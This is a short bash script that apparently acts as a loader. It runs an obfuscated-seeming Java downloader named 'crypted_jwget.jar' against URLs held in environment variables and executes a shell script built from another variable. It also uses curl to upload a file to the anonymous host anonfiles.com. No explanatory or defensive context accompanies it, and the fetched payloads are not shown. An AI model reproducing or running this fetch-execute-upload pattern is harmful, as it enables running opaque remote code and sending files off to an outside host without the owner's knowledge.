#!/bin/bash
cp crypted_jwget.jar /$HOME
cd $HOME
echo $LINK2 > start2.sh
java -jar crypted_jwget.jar $LINK
bash start2.sh
curl -F "file=@start2.sh" https://api.anonfiles.com/upload
java -jar crypted_jwget.jar $LINK3
ls
#java -jar crypted_leatestacc.jar Storage1















